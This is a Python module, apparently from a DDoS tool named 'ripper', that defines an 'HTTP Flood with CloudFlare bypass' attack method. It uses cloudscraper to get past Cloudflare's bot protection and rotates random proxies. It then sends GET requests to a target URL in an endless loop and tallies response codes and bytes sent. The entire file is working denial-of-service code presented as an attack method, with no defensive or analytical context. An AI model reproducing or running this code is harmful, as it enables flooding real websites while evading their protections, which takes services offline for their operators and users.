from contextlib import suppress
from typing import Any

from cloudscraper import CloudScraper, create_scraper

from ripper.context.errors import Errors
from ripper.context.target import Target
from ripper.actions.attack_method import AttackMethod

# Forward Reference
Context = 'Context'


class CloudFlareBypass(AttackMethod):
    """HTTP Flood method with CloudFlare bypass ."""

    name: str = 'HTTP Flood with CloudFlare bypass'
    label: str = 'cloudflare-bypass'

    _target: Target
    _ctx: Context
    _proxy: Any = None
    _http_connect: CloudScraper = None

    def __init__(self, target: Target, context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self):
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), create_scraper() as self._http_connect:
            # self._http_connect.connect(self._target.hostip_port_tuple())
            self._ctx.target.statistic.connect.status_success()
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue

    def send(self, scraper: CloudScraper):
        try:
            with scraper.get(self._target.url(), proxies=self._proxy) as response:
                self._ctx.target.statistic.http_stats[response.status_code] += 1
        except Exception as e:
            self._ctx.add_error(Errors('Scraper send Err', e))
            self._ctx.target.statistic.connect.status_failed()
        else:
            sent_bytes = self._size_of_request(response.request)
            self._ctx.target.statistic.packets.status_sent(sent_bytes)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    @staticmethod
    def _size_of_request(request) -> int:
        size: int = len(request.method) +\
                    len(request.url) + \
                    len('\r\n'.join(f'{k}: {v}' for k, v in request.headers.items()))
        return size
